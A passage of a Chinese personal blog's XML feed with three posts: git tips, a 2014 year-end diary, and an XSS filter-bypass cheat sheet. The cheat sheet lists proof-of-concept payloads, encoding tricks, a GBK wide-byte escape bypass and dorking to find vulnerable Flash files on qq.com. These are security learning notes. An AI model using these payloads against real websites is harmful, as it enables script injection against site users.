<h3 id="克隆一个项目下来">克隆一个项目下来</h3><p>git clone git@github.com:username/Hello.git（username：GitHub上的用户名，SmartScript：我在GitHub上创建的仓库repository名）</p>
<h3 id="忽略文件-gitignore">忽略文件.gitignore</h3><ol>
<li>进入要忽略的目录创建文件<br> touch  .gitignore     #创建gitignore隱藏文件</li>
<li>vim .gitignore     #编辑文件，加入指定文件 </li>
<li>git add . #就可以自动忽略掉指定的文件</li>
<li>文件.gitignore的格式规范：<br>A：#为注释<br>B：可以使用shell所使用的正则表达式来进行模式匹配<br>C：匹配模式最后跟”/“说明要忽略的是目录<br>D：使用！取反（例如目录中包含  test.a，并且gitignore文件中包含  <em>.[oa]，如果在文件中加入 ！test.a   表明忽略除test.a文件以外的后缀名为.a或者.o的文件）<br>tmp.txt         //忽略tmp.txt
</em>.log           //忽略所有log文件<br>tmp/<em>           //忽略tmp文件夹所有文件<br>log/**/</em>.log    //忽略log目录下的包括子目录下的所有log文件<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#下面是我的gitignore文件的内容 </span><br><span class="line">#忽略gitignore文件 </span><br><span class="line">.gitignore</span><br><span class="line">#忽略后缀名为.o和.a的文件 </span><br><span class="line">*.[oa]</span><br><span class="line">#忽略后缀名为.exe和.txt的文件 </span><br><span class="line">*.exe</span><br><span class="line">*.txt</span><br><span class="line">#显示指定忽略名称为main的文件 </span><br><span class="line">main</span><br><span class="line"></span><br><span class="line"># eg:c++ .gitignore</span><br><span class="line">*.sdf</span><br><span class="line">.gitignore</span><br><span class="line">Debug/*</span><br><span class="line">Release/*</span><br><span class="line">ipch/*</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="更新远程仓库代码到本地">更新远程仓库代码到本地</h3><ol>
<li>查看远程仓库<br> git remote -v</li>
<li>从远程获取最新版本到本地<br> git fetch origin master</li>
<li>比较本地的仓库和远程参考的区别 （作参考，可不用执行该步）<br> git log -p master..  origin/master</li>
<li>远程代码下载下来合并到本地仓库<br> git merge origin/master</li>
<li>git add –p (patch模式)<br> eg: 修改了a,b,c文件<br> git add -p    //列出所有更改<br> y/a 应用<br> git commit -m “..”<br> …</li>
</ol>
<h3 id="关于可能出现的错误">关于可能出现的错误</h3><ol>
<li><p>在执行<br> $ git remote addorigin git@github.com:defnngj/hello-world.git<br> 错误提示：fatal: remote origin already exists.<br> 解决办法：<br> $ git remote rm origin<br> 然后在执行：$ git remote add origin git@github.com:defnngj/hello-world.git 就不会报错误了</p>
</li>
<li><p>在执行<br> $ git push origin master<br> 错误提示：error:failed to push som refs to…….<br> 解决办法：<br> $ git pull origin master // 先把远程服务器github上面的文件拉下来，再push 上去。</p>
</li>
<li><p>遇到的问题:<br> update were rejected because the tip of your current branch is behind ….<br> 原因是远程的的代码库比我本地的代码库要新。<br> 所以需要在远程代码库pull一次下来。<br> 再修改代码。再push。</p>
</li>
<li><p>遇到遇到的问题:<br> change not staged for commit 通过add 和 checkout解决不了<br> git rm –cached <file> (git rm –cached test)<br> git add file (git add test/)</file></p>
</li>
</ol>
<h3 id="git命令速查表">git命令速查表</h3><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/git-conclusion-4.png" alt="tool-editor"></p>
<h3 id="git详细命令表">git详细命令表</h3><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/git-conclusion-5.png" alt="tool-editor"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>windows下git使用总结</p>
<h3 id="初始化配置Github">初始化配置Github</h3><ol>
<li><p>下载msysgit并安装 : <a href="http://msysgit.github.io/" target="_blank" r]]>
    </summary>
    
      <category term="git" scheme="http://blog.idhyt.com/tags/git/"/>
    
      <category term="technic" scheme="http://blog.idhyt.com/categories/technic/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[我的2014]]></title>
    <link href="http://blog.idhyt.com/2015/01/02/diary-annual-summary-2014/"/>
    <id>http://blog.idhyt.com/2015/01/02/diary-annual-summary-2014/</id>
    <published>2015-01-01T19:51:11.000Z</published>
    <updated>2015-12-31T18:39:14.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;12点，看着别人都是带着wife跨年，先不说这wife是不是自己的，可是我连个wifi都没有，网都连不上，完全不给刷存在感的机会，好心塞。跨年这种事吧，两种情况下才能有气氛，一种是情侣，先不说情侣是不是自己的（又来。。），另一种是身边还有一种单身的人一起热闹，第一种是个人问题，好吧，我个人有问题，第二种吧到了这种年纪，都是在晒孩子的，出了校门哪还有这群闲人啊，想想也是醉了。自己呆着打打游戏吧，总觉得有点可惜，出去看看吧，看的是别人在热闹，一个字，冷暖自知（威虎山还不错）。</p>
<hr>

<p>&#160; &#160; &#160; &#160;另起一行竟然打了个\n。。开始记事件，此刻应该来点音乐。。好，开始。从去年总结开始，过年回家在家呆了一个月，该玩的也玩了，该见的朋友也见了，好像该说的话也说了一点，不过没什么用，很多事情不是你努力就可以改变的，何况我也没有努力过。之后回学校，跟小伙伴们去了趟四姑娘山，想在回想起来还很清晰，当时是感冒加上高原反映加上精神有点亢奋是玩嗨了，这个写下来还是有点多，我还是去看看大神最后剪辑的视频回味一番就好了。看的好伤感啊，正如我毕业论文最后写的，光阴荏苒，岁月如歌，感谢走私团伙的每一位小伙伴，是你们让我拥有一个无比美好的研究生生活，你们的幽默诙谐，令我深深的难忘，你们的一颦一笑，都历历在目，能在这样一个环境中度过，是我极大的荣幸，太官方了哈哈，不过想想校园时光真的是无比美好呐。四姑娘山回来就是各种晃悠日子，每天写点论文，出去吃个饭，看个电影，周末还打个球啥的，那时候经常会想，哎呀，这一天一天没感觉啊，毕业了一定会很想念现在的日子吧，要珍惜每一天的生活，但是总是在拥有的时候，只是想着去珍惜，但却不知道如何去珍惜，就这么悄悄的失去了。离毕业就三个月了，好好珍惜，吃过饭上去打一把人机啊！离毕业就两个月了，好好珍惜，吃过饭打匹配啊！撸一把，撸一把写论文！撸一把刚好去吃饭！又被虐了，不开心！不开心了撸一把！离毕业就一个月了，好好珍惜，卧槽，要答辩了，论文写不完了！不撸了，写论文！好吧，撸一把真的写论文了！重复率xx%，毕不了业了！戒撸了！xx要去查重了，一群人围上去跟看小视频一样！现在想想脑子里都是8楼工作室各种回荡的声音，也是满满的回忆。最后大家都顺利毕业了，照了毕业照，吃了散伙饭，我也如愿的去了云南，虽然过程也是一波三折，虽然有点遗憾没能和黑豆女神在云南会和，但最后也是去了，也留下了奇思妙想的回忆，或许这比那些更加特别呢，是吧哈哈。。有机会还是要再去一趟云南，泸沽湖住个十天半个月的，如果有机会的话。</p>
<hr>

<p>&#160; &#160; &#160; &#160;至此，真的是又一次毕业了，青春又一次散场，虽然不能算是青春了，但是希望大家都永远年轻，永远热泪盈眶，永远心怀梦想，虽然我没什么梦想(感觉又再自黑)。之后回家在家呆了一周，去郑州见了朋友，来到了珠海，开始正式入职工作，感觉没有什么可以回忆的东西了，上班，吃饭，下班，睡觉。这种有规律的生活和学校无规律的生活最大的差别是什么，就是你去回忆学校的事情，你能想到很多很多，甚至很多小的细节，毕业从抽屉里扒出三年所有的发票电影票之类的东西，看着很多都能回想起来当时做了什么，跟谁，在哪里。而工作后的事情，回想半年的，好像没什么东西，就是工作，就好比每周去写周报，卧槽，这周我到底做了什么，每天都很忙，但是好像每天也没忙什么。这种感觉很奇妙，就好比心电图，之前你每天都是在上下波动的，你可以看到他在活跃，在生活，你想不到下一刻会有什么事情发生，是惊喜还是惊吓，忽然就平静下来，不在上下波动而变成一条缓慢向前的直线，虽然你看不到尽头，但是你能想到下一刻大概的轮廓，你没有了期待，没有思考的触点，甚至连梦想这种东西都没有去认真想过。</p>
<hr>

<p>&#160; &#160; &#160; &#160;我这种人平时也那么蒙蒙的，也不怎么知道主动联系人，发状态也是不正经的带着一些段子的味道，也只有在这安静的夜晚，静下心来才会想一些东西，不是不愿静，只是不想静，这种年纪不适合太伤感。就像毕业走的时候，本来就一个人送我，最后竟然辣么多人，我当时其实挺伤感的，因为我知道，一转身，一张张脸以后可能就再也见不到了，当时是多想拥抱一下，可惜下不去那手。最后我发现你们走的时候头都没回，我还想着你们一步三回头的看我几眼，你们竟然慌慌张张的赶着时间去吃自助餐！火车上收到你们的短信，真的是很不舍，要是不用工作该多好。</p>
<hr>

<p>&#160; &#160; &#160; &#160;写着写着还真是思绪乱飞有点伤感了，就此打住。今年就算过去了，刚毕业半年，去年一起来实习的小伙伴走了好几个，有的创业，有的跳槽，还有的纯粹是因为在公司得不到自己想要的而辞职，我只能羡慕他们，有梦想有心志，年轻有机会失败。我总会跟别人说工作可以就别读研浪费三年时间，其实对我来说帮助还是挺大的，因为我大学读的太渣了导致毕业找工作都是问题，有时想想如果没读研或许现在我都成家了吧，孩子可能都有了吧，不过可能混的比现在更差。人生没有重来，总会想着如果再来一次我会怎样怎样，其实如果再来一次，大部分人估计还是这样子吧。朋友说我淡薄，我觉得有点太高看我了，我不是淡薄，我只是能把我得不到的东西看淡，能为自己活的轻松找的借口而已，周围诱惑太多，真的能做到不被功名利禄诱惑的，我从内心相信这样的人是不存在的，而且在这之前，你得有被诱惑的资本，很明显，我没有。</p>
<hr>

<p>&#160; &#160; &#160; &#160;不知道如何结尾，就破天荒的给自己定个目标吧，算是给慢慢变老的心态打打鸡血，2015年，在技术上边某一方面要有突破，年中，知道自己想要什么，年底，确定何去何从。每年写年终总结写到最后的时候都在想，真快啊，明年这个时候会在哪里，身边会不会有个女朋友，然后每年都这么想下去了，按照此规律今年应该想着明年这个时候肯定没有女朋友。。又来。。。。真亦假假亦真，那就当她是个段子吧。</p>
<p>&#160; &#160; &#160; &#160;See you next year! </p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;12点，看着别人都是带着wife跨年，先不说这wife是不是自己的，可是我连个wifi都没有，网都连不上，完全不给刷存在感的机会，好心塞。跨年这种事吧，两种情况下才能有气氛，一种是情侣，先不说情侣是不是自己的（又来。。）]]>
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[xss bypass]]></title>
    <link href="http://blog.idhyt.com/2014/10/15/technic-xss-bypass/"/>
    <id>http://blog.idhyt.com/2014/10/15/technic-xss-bypass/</id>
    <published>2014-10-15T03:56:24.000Z</published>
    <updated>2015-12-31T11:53:23.000Z</updated>
    <content type="html"><![CDATA[<p>xss绕过技巧整理</p>
<h3 id="几种弹窗绕过">几种弹窗绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="number">1</span>) = <span class="built_in">Function</span>(alert(<span class="number">1</span>))()</span><br><span class="line">= <span class="built_in">Function</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()</span><br><span class="line"><span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>对应alert(<span class="number">1</span>) ascii码的<span class="number">10</span>进制形式（Text2Dec）</span><br><span class="line"><span class="comment">//小写function</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>)</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line">alert(<span class="number">1</span>) confirm(<span class="number">1</span>)  prompt(<span class="number">1</span>)</span><br><span class="line">&lt;SVG/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">BODY</span> <span class="attribute">onload</span>=<span class="value">"alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">alert(1)</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="title">scirpt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"javascript:prompt(1)"</span> <span class="attribute">method</span>=<span class="value">"post"</span>&gt;</span><span class="tag">&lt;<span class="title">input</span> <span class="attribute">name</span>=<span class="value">"action"</span> <span class="attribute">value</span>=<span class="value">"b"</span>&gt;</span><span class="tag">&lt;/<span class="title">form</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="value">comment"</span> <span class="attribute">title</span>=<span class="value">""</span><span class="value">onload='</span>/*"&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">"*/prompt(1)'"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span>   ==》<span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">""</span><span class="value">xxx"</span>/<span class="attribute">onload</span>=<span class="value">'prompt(21)'</span><span class="value">"&gt;&lt;/p&gt;</span></span></span></span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤= 括号等 使用xml编码</span></span><br><span class="line">&lt;svg&gt; <span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  </span><br><span class="line">//在SVG向量里面的<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">元素（或者其他CDATA元素 ），会先进行xml解析。因此&amp;#x28（十六进制）或者&amp;#40（十进制）或者&amp;lpar；（html实体编码）会被还原成（。</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以不封的有:</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">img</span>&gt;</span><span class="tag">&lt;<span class="title">br</span>&gt;</span><span class="tag">&lt;<span class="title">input</span>&gt;</span><span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">p</span>&gt;</span><span class="tag">&lt;<span class="title">SVG</span>&gt;</span></span><br><span class="line">其他标签不封闭会造成页面显示错误等问题。</span></span><br></pre></td></tr></table></figure>
<h3 id="xss中最经常用到的编码">xss中最经常用到的编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">html实体编码(<span class="number">10</span>进制与<span class="number">16</span>进制):</span><br><span class="line">如把尖括号编码[ <span class="xml"><span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> html十进制: &amp;#60;  html十六进制:&amp;#x3c;</span><br><span class="line">javascript的八进制跟十六进制:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> js八进制:\74  js十六进制:\x3c</span><br><span class="line">jsunicode编码：</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span>jsunicode:\u003c</span><br><span class="line">url编码:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> url: %22</span><br><span class="line">base64编码:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> base64: Ig==</span></span><br></pre></td></tr></table></figure>
<h3 id="一些绕过方法">一些绕过方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">换行符 %<span class="number">0</span>a</span><br><span class="line">反斜线 %<span class="number">5</span>c （js中字符串可以用\分开）</span><br><span class="line">&lt;&gt;  %<span class="number">3</span>C%<span class="number">3</span>E</span><br><span class="line">注释<span class="comment">/**/</span>可以代替 空格符</span><br><span class="line">%c0(宽字符gb2312)可以吃掉%<span class="number">5</span>c(反斜线) </span><br><span class="line">javascript中的字符可以写成unicode编码：</span><br><span class="line">&lt; 可以表示为 \u003c , &gt; 可以表示为 \u003e，空格可以表示为\u0020</span><br><span class="line">&lt; 可以表示为 \x3c , &gt; 可以表示为 \x3e，空格可以表示为\x20</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;   ----&gt; \u003Cimg\u0020src=<span class="number">1</span>\u0020onerror=alert(<span class="number">1</span>)\u003e</span><br><span class="line">                                                 ----&gt;  \x3Cimg\u0020src=<span class="number">1</span>\u0020onerror=alert(<span class="number">1</span>)\x3e</span><br><span class="line"></span><br><span class="line">JS字符串中，字符还可以表示为unicode的形式。即：单引号还可以表示为\u0027或\x27,可尝试\有没有被过滤</span><br><span class="line">&lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;标签不解析HTML</span><br><span class="line"><span class="string">"h"</span>+<span class="string">"t"</span>+<span class="string">"t"</span>+<span class="string">"p"</span>，绕过对http的过滤</span><br><span class="line">&lt;input onfocus=<span class="string">"alert(1)"</span> autofocus&gt;，自动执行</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;绕过对&lt;script&gt;的过滤</span><br><span class="line"><span class="comment">/**/</span>绕过对空格的过滤&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">"&lt;img/**/src='1'/**/onerror='alert(1)'/&gt;"</span>);<span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">标签中多对输入可以结合<span class="comment">/**/</span>的使用</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">""</span>;<span class="comment">/*"; 值为：";<span class="comment">/*，（首先闭合双引号，然后使用<span class="comment">/*注释，与下面注释进行闭合）var b = "*/</span>alert(1)//"; 值为：*/</span>alert(1)//</span><br><span class="line"></span><br><span class="line">如果是图片可能是判定后缀名在最后加上.jpg</span><br><span class="line">突破对长度的限制&lt;script&gt;eval(location.hash.slice(1))</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>#alert(‘a’)</span><br><span class="line">data协议，绕过chrome </span><br><span class="line">filter.php?url=<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='</span>&gt;</span>click<span class="tag">&lt;<span class="title">a</span>&gt;</span></span><br><span class="line">IE的注释方式<span class="comment">&lt;!--[if IE]&gt;&lt;img src=# width=0 height=0 onerror=alert(/insight-labs/)&gt;&lt;![endif]--&gt;</span></span><br><span class="line"></span><br><span class="line">chrome会自动对", &gt;, <span class="tag">&lt; 进行转换。</span><br><span class="line">&lt;<span class="attribute">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">chrome会过滤为<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>,绕过：<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">'127.0.0.1/1.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span> 其中1.jp也可以是1.jpg等，内容为js代码如:alert(1)</span></span><br></pre></td></tr></table></figure>
<h3 id="chrome如何搜索关键字">chrome如何搜索关键字</h3><p>基本语句肯定是 site:qq.com filetype:swf<br>意思是，限定域名为qq.com 文件类型为FLASH文件。<br>显然这样会搜索出很多FLASH文件，不利于我们后续的漏洞查找，所以我们需要输入某个关键词来进一步缩小范围。<br>这里我列举一些寻找关键词的方式。<br>1 已知存在缺陷的FLASH文件名或参数名，如：swfupload,jwplayer等<br>2 多媒体功能的FLASH文件名，如：upload，player, music, video等<br>3 调用的外部配置或数据文件后缀，如: xml, php 等<br>4 前期经验积累下来的程序员特征参数名用词，如: callback, cb , function 等<br>结合以上经验，使用其中第三条：<br>搜索： site:qq.com filetype:swf inurl:xml<br>可以找到这个FLASH</p>
<h3 id="插入漏洞方式">插入漏洞方式</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1 JavaScript中字符串之间的运算利用</span><br><span class="line">&lt;a href="javascript:alert(1)//html"&gt;click me&lt;/a&gt;</span><br><span class="line">&lt;a href="javascript:alert(1)-html"&gt;click me&lt;/a&gt;</span><br><span class="line">执行呈现相同的效果，因为javascript是弱类型语言，所以字符串与字符串之间的各种运算都是合法的</span><br><span class="line"></span><br><span class="line">2 HTML属性在执行时会做HTMLDecode编码</span><br><span class="line">HTML属性：十进制和十六进制，&amp;#56和&amp;#x5a形式 </span><br><span class="line">CSS属性：十进制和十六进制，\6c形式</span><br><span class="line">JavaScript：八进制和十六进制，\56,和\x5c形式，汉字需要使用Unicode编码，\u0000形式</span><br><span class="line">&lt;img src="http://www.baidu.com/img/bdlogo.gif"&gt;</span><br><span class="line">&lt;img src="&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x77;&amp;#x77;&amp;#x77;&amp;#x2e;&amp;#x62;&amp;#x61;&amp;#x69;&amp;#x64;&amp;#x75;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x69;&amp;#x6d;&amp;#x67;&amp;#x2f;&amp;#x62;&amp;#x64;&amp;#x6c;&amp;#x6f;&amp;#x67;&amp;#x6f;&amp;#x2e;&amp;#x67;&amp;#x69;&amp;#x66;";&gt;</span><br><span class="line">需要留出双引号，不可对双引号进行转移</span><br><span class="line"></span><br><span class="line">3、宽字节处理addslashs，单引号、双引号、反斜杠之前加反斜杠的情况</span><br><span class="line">原理：网页头部指明这是GBK编码，GBK编码第一字节的范围是0x81~0xFE，第二字节的范围是0x40~0x7E与0x80~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5C，正好是GBK的低字节中，如果之前有一个高字节，那么正好会被组成一个合法字符。</span><br><span class="line">&lt;?php </span><br><span class="line">header("Content-Type:text/html;charset=GBK");?&gt;  </span><br><span class="line">&lt;script&gt;      </span><br><span class="line">var a="</span><br><span class="line">&lt;?php </span><br><span class="line">echo addslashes($_GET['url']);</span><br><span class="line">?&gt;</span><br><span class="line">";  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">?&gt;  构造：.php?url=123%81";alert(1);//</span><br><span class="line"></span><br><span class="line">4、UTF-7编码(仅IE支持，会自动判断是否出现UTF-7编码的字符串)</span><br></pre></td></tr></table></figure>
<h3 id="DOM_xss特点">DOM xss特点</h3><ol>
<li>利用代码也是在地址栏里输入，</li>
<li>在JS里，通过location.search得到地址里的代码，类似的还有:<br>A.location.href : 地址栏里的地址,<br>B.location.hash: 地址栏里#及其之后的内容,<br>C.document.referrer: 当前页面的源（比如你从A.com点一个链接进入了B.com，那么B.com里的document.referrer等于A.com）</li>
<li>通过JS设置了iframe的src属性，这是一个典型的通过JS操作属性而导致的XSS。</li>
</ol>
<p>查找此类漏洞的方法 </p>
<ol>
<li>以location为关键词进行查找，</li>
<li>进而看location传入的参数是否被过滤后再进行使用。</li>
<li>如有未过滤而被调用的情况，则考虑如何构造利用代码。</li>
</ol>
<h3 id="11个免费的Web安全测试工具">11个免费的Web安全测试工具</h3><p>1.Netsparker Community Edition(Windows)<br>这个程序可以检测SQL注入和跨页脚本事件。当检测完成之后它会给你提供一些解决方案。<br>2.Websecurify(Windows, Linux, Mac OS X)<br>这是个简单易用的开源工具，此程序还有一些人插件支持，可以自动检测网页漏洞。运行后可生成多种格式的检测报告<br>3.Wapiti(Windows, Linux, Mac OS X)<br>这是一个用Python编写的开源的工具，可以检测网页应用程序，探测网页中存在的注入点。<br>4.N-Stalker Free Version(Windows)<br>此工具可一次检测100个以上的页面，包括跨页脚本的检测。<br>5.skipfish(Windows, Linux, Mac OS X)<br>这是一个轻量级的安全测试工具，处理速度很快，每秒可处理2000个请求。<br>6.Scrawlr(Windows)<br>HP的一款免费软件，可检测SQL注入漏洞。<br>7.Watcher(Windows) <a href="http://websecuritytool.codeplex.com/documentation" target="_blank" rel="external">http://websecuritytool.codeplex.com/documentation</a><br>这个是Fiddler的插件，可在后台静默运行，可检测跨域提交等。。<br>8.x5s(Windows) <a href="http://xss.codeplex.com/releases/view/43170" target="_blank" rel="external">http://xss.codeplex.com/releases/view/43170</a><br>跟前一个一样也是Fiddler的插件，用于检测存在XSS漏洞，在网页提供给用户输入的地方是否有过滤&lt;, &gt;等字符。<br>9.Exploit-Me(Windows, Linux, Mac OS X)<br>这个是火狐的插件，由XSS-Me，SQL Inject Me 和 Access-Me 这3个构成，当浏览网页时就会开始检测，可检测XSS漏洞，SQL注入漏洞等。<br>10.WebScarab(Windows, Linux, Mac OS X)<br>这个实际上是一个代理软件，有很多功能，可以检测XSS跨站脚本漏洞、SQL注入漏洞等。。<br>11.Acunetix Free Version(Windows)<br>这个是免费版，相对于专业版来说有一些功能限制，不过还是可以用的，可检测网站上的XSS漏洞。</p>
<h3 id="其他">其他</h3><p>1.二哥的XSS教学 - by gainover<br><a href="http://xsst.sinaapp.com/example/1-1.php" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-1.php</a><br>2.心伤的瘦子 [腾讯实例教程] 那些年我们一起学XSS)<br><a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90/type/1/page/1" target="_blank" rel="external">http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90/type/1/page/1</a><br>3.HTML特殊字符编码对照表<br><a href="http://www.jb51.net/onlineread/htmlchar.htm" target="_blank" rel="external">http://www.jb51.net/onlineread/htmlchar.htm</a><br>4.html字符实体<br><a href="http://www.w3school.com.cn/html/html_entities.asp" target="_blank" rel="external">http://www.w3school.com.cn/html/html_entities.asp</a><br>5.xss字符转换工具：<br><a href="http://app.baidu.com/app/enter?appid=280383" target="_blank" rel="external">http://app.baidu.com/app/enter?appid=280383</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>xss绕过技巧整理</p>
<h3 id="几种弹窗绕过">几种弹窗绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</sp]]>
    </summary>
    
      <category term="xss" scheme="http://blog.idhyt.com/tags/xss/"/>
    
      <category term="technic" scheme="http://blog.idhyt.com/categories/technic/"/>
    
  </entry>
  
  <entry>
